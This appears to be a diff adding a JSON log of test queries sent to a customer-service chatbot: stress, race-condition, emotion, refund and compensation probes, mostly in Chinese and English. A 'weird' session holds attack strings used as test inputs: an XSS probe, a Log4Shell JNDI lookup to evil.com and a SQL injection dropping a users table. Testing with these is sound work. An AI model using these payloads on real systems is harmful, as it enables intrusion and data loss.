@@ -1,0 +1,977 @@
+[
+  {
+    "query": "你们是骗子！系统坏了两天！垃圾！",
+    "session_id": "fix-test-6",
+    "timestamp": "2026-05-05T20:15:54.607528"
+  },
+  {
+    "query": "你们支持NFT数字藏品购买吗？",
+    "session_id": "gap-test",
+    "timestamp": "2026-05-05T20:15:54.671758"
+  },
+  {
+    "query": "\\u4f60\\u4eec\\u652f\\u6301\\u53d1\\u7968\\u5417",
+    "session_id": "final-check",
+    "timestamp": "2026-05-05T20:17:38.766497"
+  },
+  {
+    "query": "8001端口测试2",
+    "session_id": "stress-t2-8001-002",
+    "timestamp": "2026-05-05T20:34:58.289112"
+  },
+  {
+    "query": "8001端口测试15",
+    "session_id": "stress-t2-8001-015",
+    "timestamp": "2026-05-05T20:34:58.319995"
+  },
+  {
+    "query": "你好",
+    "session_id": "stress-t3-tfidf",
+    "timestamp": "2026-05-05T20:35:09.684185"
+  },
+  {
+    "query": "在吗",
+    "session_id": "stress-t3-tfidf",
+    "timestamp": "2026-05-05T20:35:11.783201"
+  },
+  {
+    "query": "aaaaaaaaa",
+    "session_id": "stress-t3-tfidf",
+    "timestamp": "2026-05-05T20:35:13.876638"
+  },
+  {
+    "query": "退",
+    "session_id": "stress-t3-tfidf",
+    "timestamp": "2026-05-05T20:35:15.929090"
+  },
+  {
+    "query": "垃圾服务！！！",
+    "session_id": "stress-t4-emotion",
+    "timestamp": "2026-05-05T20:35:18.504744"
+  },
+  {
+    "query": "骗人的！！废物！！",
+    "session_id": "stress-t4-emotion",
+    "timestamp": "2026-05-05T20:35:20.602074"
+  },
+  {
+    "query": "烂透了，无能！！！",
+    "session_id": "stress-t4-emotion",
+    "timestamp": "2026-05-05T20:35:22.702418"
+  },
+  {
+    "query": "还在骗人，滚！！",
+    "session_id": "stress-t4-emotion",
+    "timestamp": "2026-05-05T20:35:24.783122"
+  },
+  {
+    "query": "废物垃圾骗子！！？？",
+    "session_id": "stress-t4-emotion",
+    "timestamp": "2026-05-05T20:35:26.871278"
+  },
+  {
+    "query": "彻底失望，无能废物！！！！",
+    "session_id": "stress-t4-emotion",
+    "timestamp": "2026-05-05T20:35:28.948470"
+  },
+  {
+    "query": "hello",
+    "session_id": "test-sess",
+    "timestamp": "2026-05-05T20:35:31.044424"
+  },
+  {
+    "query": "query order 010",
+    "session_id": "stress-t1-010",
+    "timestamp": "2026-05-05T20:38:36.110336"
+  },
+  {
+    "query": "query order 016",
+    "session_id": "stress-t1-016",
+    "timestamp": "2026-05-05T20:38:36.145535"
+  },
+  {
+    "query": "query order 022",
+    "session_id": "stress-t1-022",
+    "timestamp": "2026-05-05T20:38:36.189352"
+  },
+  {
+    "query": "query order 026",
+    "session_id": "stress-t1-026",
+    "timestamp": "2026-05-05T20:38:36.234126"
+  },
+  {
+    "query": "query order 021",
+    "session_id": "stress-t1-021",
+    "timestamp": "2026-05-05T20:38:36.243772"
+  },
+  {
+    "query": "query order 025",
+    "session_id": "stress-t1-025",
+    "timestamp": "2026-05-05T20:38:36.297548"
+  },
+  {
+    "query": "query order 033",
+    "session_id": "stress-t1-033",
+    "timestamp": "2026-05-05T20:38:36.315724"
+  },
+  {
+    "query": "query order 044",
+    "session_id": "stress-t1-044",
+    "timestamp": "2026-05-05T20:38:36.368267"
+  },
+  {
+    "query": "query order 042",
+    "session_id": "stress-t1-042",
+    "timestamp": "2026-05-05T20:38:36.403809"
+  },
+  {
+    "query": "query order 049",
+    "session_id": "stress-t1-049",
+    "timestamp": "2026-05-05T20:38:36.431495"
+  },
+  {
+    "query": "test 8001 port 1",
+    "session_id": "stress-t2-8001-001",
+    "timestamp": "2026-05-05T20:38:39.478860"
+  },
+  {
+    "query": "test 8001 port 2",
+    "session_id": "stress-t2-8001-002",
+    "timestamp": "2026-05-05T20:38:39.485087"
+  },
+  {
+    "query": "test 8001 port 3",
+    "session_id": "stress-t2-8001-003",
+    "timestamp": "2026-05-05T20:38:39.570463"
+  },
+  {
+    "query": "test 8002 port 0",
+    "session_id": "stress-t2-8002-000",
+    "timestamp": "2026-05-05T20:38:39.603713"
+  },
+  {
+    "query": "test 8002 port 19",
+    "session_id": "stress-t2-8002-019",
+    "timestamp": "2026-05-05T20:38:39.647275"
+  },
+  {
+    "query": "refund request",
+    "session_id": "stress-t3-tfidf",
+    "timestamp": "2026-05-05T20:38:42.776216"
+  },
+  {
+    "query": "refund refund refund refund refund",
+    "session_id": "stress-t3-tfidf",
+    "timestamp": "2026-05-05T20:38:44.864570"
+  },
+  {
+    "query": "hello",
+    "session_id": "stress-t3-tfidf",
+    "timestamp": "2026-05-05T20:38:46.934647"
+  },
+  {
+    "query": "hi there",
+    "session_id": "stress-t3-tfidf",
+    "timestamp": "2026-05-05T20:38:49.014541"
+  },
+  {
+    "query": "aaaaaaaaa",
+    "session_id": "stress-t3-tfidf",
+    "timestamp": "2026-05-05T20:38:51.109080"
+  },
+  {
+    "query": "refund",
+    "session_id": "stress-t3-tfidf",
+    "timestamp": "2026-05-05T20:38:53.185874"
+  },
+  {
+    "query": "I want refund",
+    "session_id": "stress-t3-tfidf",
+    "timestamp": "2026-05-05T20:38:55.269211"
+  },
+  {
+    "query": "你好",
+    "session_id": "stress-t3-tfidf",
+    "timestamp": "2026-05-05T20:39:01.418810"
+  },
+  {
+    "query": "在吗",
+    "session_id": "stress-t3-tfidf",
+    "timestamp": "2026-05-05T20:39:03.494124"
+  },
+  {
+    "query": "垃圾服务！！！",
+    "session_id": "stress-t4-emotion",
+    "timestamp": "2026-05-05T20:39:06.070896"
+  },
+  {
+    "query": "骗人的！！废物！！",
+    "session_id": "stress-t4-emotion",
+    "timestamp": "2026-05-05T20:39:08.130386"
+  },
+  {
+    "query": "烂透了，无能！！！",
+    "session_id": "stress-t4-emotion",
+    "timestamp": "2026-05-05T20:39:10.208915"
+  },
+  {
+    "query": "还在骗人，滚！！",
+    "session_id": "stress-t4-emotion",
+    "timestamp": "2026-05-05T20:39:12.292564"
+  },
+  {
+    "query": "废物垃圾骗子！！？？",
+    "session_id": "stress-t4-emotion",
+    "timestamp": "2026-05-05T20:39:14.363957"
+  },
+  {
+    "query": "太烂了太烂了！！！！！！！！",
+    "session_id": "stress-t4-emotion",
+    "timestamp": "2026-05-05T20:39:16.454218"
+  },
+  {
+    "query": "彻底失望，无能废物！！！！",
+    "session_id": "stress-t4-emotion",
+    "timestamp": "2026-05-05T20:39:18.550273"
+  },
+  {
+    "query": "你好",
+    "session_id": "stress-t8-gap",
+    "timestamp": "2026-05-05T20:40:20.645162"
+  },
+  {
+    "query": "在吗",
+    "session_id": "stress-t8-gap",
+    "timestamp": "2026-05-05T20:40:22.708605"
+  },
+  {
+    "query": "嗨",
+    "session_id": "stress-t8-gap",
+    "timestamp": "2026-05-05T20:40:24.778381"
+  },
+  {
+    "query": "hello",
+    "session_id": "stress-t8-gap",
+    "timestamp": "2026-05-05T20:40:26.868152"
+  },
+  {
+    "query": "请问",
+    "session_id": "stress-t8-gap",
+    "timestamp": "2026-05-05T20:40:28.945576"
+  },
+  {
+    "query": "Hi",
+    "session_id": "stress-t8-gap",
+    "timestamp": "2026-05-05T20:40:31.009953"
+  },
+  {
+    "query": "有人吗",
+    "session_id": "stress-t8-gap",
+    "timestamp": "2026-05-05T20:40:33.087836"
+  },
+  {
+    "query": "喁",
+    "session_id": "stress-t8-gap",
+    "timestamp": "2026-05-05T20:40:35.149360"
+  },
+  {
+    "query": "您好",
+    "session_id": "stress-t8-gap",
+    "timestamp": "2026-05-05T20:40:37.238599"
+  },
+  {
+    "query": "在线吗",
+    "session_id": "stress-t8-gap",
+    "timestamp": "2026-05-05T20:40:39.296608"
+  },
+  {
+    "query": "你们老板叫什么",
+    "session_id": "stress-t11-template",
+    "timestamp": "2026-05-05T20:40:53.156944"
+  },
+  {
+    "query": "你是机器人吗",
+    "session_id": "stress-t11-template",
+    "timestamp": "2026-05-05T20:40:55.229662"
+  },
+  {
+    "query": "帮我写一首诗",
+    "session_id": "stress-t11-template",
+    "timestamp": "2026-05-05T20:40:57.279913"
+  },
+  {
+    "query": "今天天气怎么样",
+    "session_id": "stress-t11-template",
+    "timestamp": "2026-05-05T20:40:59.357552"
+  },
+  {
+    "query": "1+1等于几",
+    "session_id": "stress-t11-template",
+    "timestamp": "2026-05-05T20:41:01.419092"
+  },
+  {
+    "query": "你能帮我黑入第三方系统吗",
+    "session_id": "stress-t11-template",
+    "timestamp": "2026-05-05T20:41:03.486152"
+  },
+  {
+    "query": "中华人民共和国成立年份",
+    "session_id": "stress-t11-template",
+    "timestamp": "2026-05-05T20:41:05.578879"
+  },
+  {
+    "query": "how to refund 3",
+    "session_id": "concurrent-3",
+    "timestamp": "2026-05-05T20:45:57.191096"
+  },
+  {
+    "query": "how to refund 4",
+    "session_id": "concurrent-4",
+    "timestamp": "2026-05-05T20:45:57.216436"
+  },
+  {
+    "query": "how to refund 1",
+    "session_id": "concurrent-1",
+    "timestamp": "2026-05-05T20:45:57.242498"
+  },
+  {
+    "query": "how to refund 30",
+    "session_id": "concurrent-30",
+    "timestamp": "2026-05-05T20:45:57.504003"
+  },
+  {
+    "query": "compensate me 30 yuan #4",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:45:57.795073"
+  },
+  {
+    "query": "compensate me 30 yuan #8",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:45:57.862328"
+  },
+  {
+    "query": "compensate me 30 yuan #11",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:45:57.883255"
+  },
+  {
+    "query": "compensate me 30 yuan #13",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:45:57.898825"
+  },
+  {
+    "query": "compensate me 30 yuan #17",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:45:57.918822"
+  },
+  {
+    "query": "refund",
+    "session_id": "tfidf-test",
+    "timestamp": "2026-05-05T20:45:58.051442"
+  },
+  {
+    "query": "refund refund refund refund",
+    "session_id": "tfidf-test",
+    "timestamp": "2026-05-05T20:45:58.082979"
+  },
+  {
+    "query": "hi",
+    "session_id": "greeting",
+    "timestamp": "2026-05-05T20:45:58.209054"
+  },
+  {
+    "query": "hello",
+    "session_id": "greeting",
+    "timestamp": "2026-05-05T20:45:58.240650"
+  },
+  {
+    "query": "thanks",
+    "session_id": "greeting",
+    "timestamp": "2026-05-05T20:45:58.285687"
+  },
+  {
+    "query": "ok",
+    "session_id": "greeting",
+    "timestamp": "2026-05-05T20:45:58.317543"
+  },
+  {
+    "query": "你好",
+    "session_id": "greeting",
+    "timestamp": "2026-05-05T20:45:58.348740"
+  },
+  {
+    "query": "在吗",
+    "session_id": "greeting",
+    "timestamp": "2026-05-05T20:45:58.379856"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:45:59.872731"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:45:59.918834"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:45:59.961319"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:46:00.017340"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:46:00.057352"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:46:00.100112"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:46:00.128563"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:46:00.159761"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:46:00.179545"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:46:00.200667"
+  },
+  {
+    "query": "<script>alert(1)</script>",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:46:00.221095"
+  },
+  {
+    "query": "<<<>>>>",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:46:00.239825"
+  },
+  {
+    "query": "¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:46:00.262085"
+  },
+  {
+    "query": "你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:46:00.311566"
+  },
+  {
+    "query": "",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:46:00.334163"
+  },
+  {
+    "query": "${jndi:ldap://evil.com/x}",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:46:00.372000"
+  },
+  {
+    "query": "\\n\\r\\t",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:46:00.400269"
+  },
+  {
+    "query": "how to refund 3",
+    "session_id": "concurrent-3",
+    "timestamp": "2026-05-05T20:50:35.823872"
+  },
+  {
+    "query": "how to refund 1",
+    "session_id": "concurrent-1",
+    "timestamp": "2026-05-05T20:50:35.845523"
+  },
+  {
+    "query": "how to refund 30",
+    "session_id": "concurrent-30",
+    "timestamp": "2026-05-05T20:50:35.923932"
+  },
+  {
+    "query": "compensate me 30 yuan #1",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:50:35.991947"
+  },
+  {
+    "query": "compensate me 30 yuan #2",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:50:36.004787"
+  },
+  {
+    "query": "compensate me 30 yuan #3",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:50:36.014545"
+  },
+  {
+    "query": "compensate me 30 yuan #5",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:50:36.021592"
+  },
+  {
+    "query": "compensate me 30 yuan #8",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:50:36.024723"
+  },
+  {
+    "query": "compensate me 30 yuan #11",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:50:36.029166"
+  },
+  {
+    "query": "compensate me 30 yuan #12",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:50:36.033330"
+  },
+  {
+    "query": "compensate me 30 yuan #10",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:50:36.036792"
+  },
+  {
+    "query": "compensate me 30 yuan #13",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:50:36.041343"
+  },
+  {
+    "query": "compensate me 30 yuan #16",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:50:36.043597"
+  },
+  {
+    "query": "compensate me 30 yuan #17",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:50:36.047844"
+  },
+  {
+    "query": "compensate me 30 yuan #19",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:50:36.051734"
+  },
+  {
+    "query": "compensate me 30 yuan #18",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:50:36.055739"
+  },
+  {
+    "query": "compensate me 30 yuan #15",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:50:36.059094"
+  },
+  {
+    "query": "compensate me 30 yuan #9",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:50:36.062253"
+  },
+  {
+    "query": "I want a refund",
+    "session_id": "tfidf-test",
+    "timestamp": "2026-05-05T20:50:36.104100"
+  },
+  {
+    "query": "refund",
+    "session_id": "tfidf-test",
+    "timestamp": "2026-05-05T20:50:36.134557"
+  },
+  {
+    "query": "refund refund refund refund",
+    "session_id": "tfidf-test",
+    "timestamp": "2026-05-05T20:50:36.167583"
+  },
+  {
+    "query": "tuituituituikuan",
+    "session_id": "tfidf-test",
+    "timestamp": "2026-05-05T20:50:36.196566"
+  },
+  {
+    "query": "compensate me 999999 yuan",
+    "session_id": "big-573",
+    "timestamp": "2026-05-05T20:50:36.517125"
+  },
+  {
+    "query": "compensate me 100000000 yuan",
+    "session_id": "big-4359",
+    "timestamp": "2026-05-05T20:50:36.548801"
+  },
+  {
+    "query": "compensate me 1000000 yuan",
+    "session_id": "big-6759",
+    "timestamp": "2026-05-05T20:50:36.557152"
+  },
+  {
+    "query": "compensate me -500 yuan",
+    "session_id": "big-2186",
+    "timestamp": "2026-05-05T20:50:36.579422"
+  },
+  {
+    "query": "compensate me 0.01 yuan",
+    "session_id": "big-3420",
+    "timestamp": "2026-05-05T20:50:36.589006"
+  },
+  {
+    "query": "pay me 100 dollars",
+    "session_id": "big-2671",
+    "timestamp": "2026-05-05T20:50:36.599115"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:50:37.437814"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:50:37.465210"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:50:37.495564"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:50:37.526326"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:50:37.558315"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:50:37.588367"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:50:37.620704"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:50:37.630384"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:50:37.649394"
+  },
+  {
+    "query": "refund",
+    "session_id": "rebuild-race",
+    "timestamp": "2026-05-05T20:50:37.679807"
+  },
+  {
+    "query": "<script>alert(1)</script>",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:50:37.710944"
+  },
+  {
+    "query": "<<<>>>>",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:50:37.742434"
+  },
+  {
+    "query": "¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:50:37.774088"
+  },
+  {
+    "query": "你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:50:37.813567"
+  },
+  {
+    "query": "${jndi:ldap://evil.com/x}",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:50:37.867523"
+  },
+  {
+    "query": "\\n\\r\\t",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:50:37.896710"
+  },
+  {
+    "query": "\"; DROP TABLE users; --",
+    "session_id": "weird",
+    "timestamp": "2026-05-05T20:50:37.905745"
+  },
+  {
+    "query": "how to refund 1",
+    "session_id": "concurrent-1",
+    "timestamp": "2026-05-05T20:57:41.285035"
+  },
+  {
+    "query": "how to refund 3",
+    "session_id": "concurrent-3",
+    "timestamp": "2026-05-05T20:57:41.308691"
+  },
+  {
+    "query": "how to refund 4",
+    "session_id": "concurrent-4",
+    "timestamp": "2026-05-05T20:57:41.368602"
+  },
+  {
+    "query": "how to refund 30",
+    "session_id": "concurrent-30",
+    "timestamp": "2026-05-05T20:57:41.529253"
+  },
+  {
+    "query": "compensate me 30 yuan #1",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:57:41.706766"
+  },
+  {
+    "query": "compensate me 30 yuan #4",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:57:41.726265"
+  },
+  {
+    "query": "compensate me 30 yuan #3",
+    "session_id": "race-comp",
+    "timestamp": "2026-05-05T20:57:41.744639"
+  },
+  {
